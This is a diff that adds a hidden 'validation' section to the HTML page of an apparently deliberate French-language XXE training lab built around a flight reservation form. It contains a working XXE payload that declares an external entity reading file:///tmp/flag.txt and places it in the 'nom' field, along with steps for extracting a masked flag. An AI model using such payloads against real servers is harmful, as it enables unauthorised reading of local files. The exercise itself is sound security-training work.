@@ -92,6 +92,48 @@
                 📤 Essayer l'upload de fichier XML →
             </a>
         </div>
+        
+                <!-- 🏆 SECTION FLAG DE VALIDATION -->
+        <section class="info-section" style="margin-top: 30px; border-left: 4px solid #FFD700; background: rgba(255, 215, 0, 0.05);">
+            <details>
+                <summary style="color: #FFD700; font-weight: bold;">🏆 VALIDATION - Flag à trouver</summary>
+                <div class="info-content">
+                    <p><strong>Objectif :</strong> Lire le fichier <code>/tmp/flag.txt</code> sur le serveur via XXE.</p>
+                    
+                    <div style="background: #1a1a1a; padding: 15px; border-radius: 5px; margin: 10px 0;">
+                        <p style="color: #FFD700; font-weight: bold;">🎯 Méthode :</p>
+                        <ol style="color: var(--text-secondary);">
+                            <li>Utiliser ce payload XML :</li>
+                            <pre style="background: #000; color: #0f0; overflow-x: auto;">&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE root [
+&lt;!ENTITY xxe SYSTEM "file:///tmp/flag.txt"&gt;
+]&gt;
+&lt;reservation&gt;
+    &lt;nom&gt;&xxe;&lt;/nom&gt;
+    &lt;vol&gt;AF123&lt;/vol&gt;
+&lt;/reservation&gt;</pre>
+                            <li>Coller dans la zone de texte et valider</li>
+                            <li>Le flag apparaît dans la balise &lt;nom&gt;</li>
+                        </ol>
+                    </div>
+                    
+                    <div style="background: #0a1a0a; padding: 20px; border-radius: 5px; margin-top: 15px; text-align: center; border: 1px dashed #FFD700;">
+                        <p style="color: #FFD700; font-weight: bold; font-size: 1.2rem;">🔑 Le flag à trouver :</p>
+                        <p style="font-size: 2.2rem; font-family: 'Courier New', monospace; letter-spacing: 3px; background: #000; padding: 15px; border-radius: 5px; color: #0f0; font-weight: bold; border: 1px solid #0f0;">
+                            FLAG{????????????????}
+                        </p>
+                        <p style="color: var(--text-secondary); font-size: 0.9rem; margin-top: 10px;">
+                            (Format FLAG{...}, à communiquer à l'équipe quand trouvé)
+                        </p>
+                    </div>
+                    
+                    <div style="background: #1a1a1a; padding: 15px; border-radius: 5px; margin-top: 15px;">
+                        <p style="color: #ff9999; margin-bottom: 5px;">⚠️ À faire après avoir trouvé le flag :</p>
+                        <p>saisir <strong style="color: #FFD700;">FLAG{xxxxxxxxx}</strong> dans la zone pour valider que l'attaque fonctionne.</p>
+                    </div>
+                </div>
+            </details>
+        </section>
 
     </main>
 
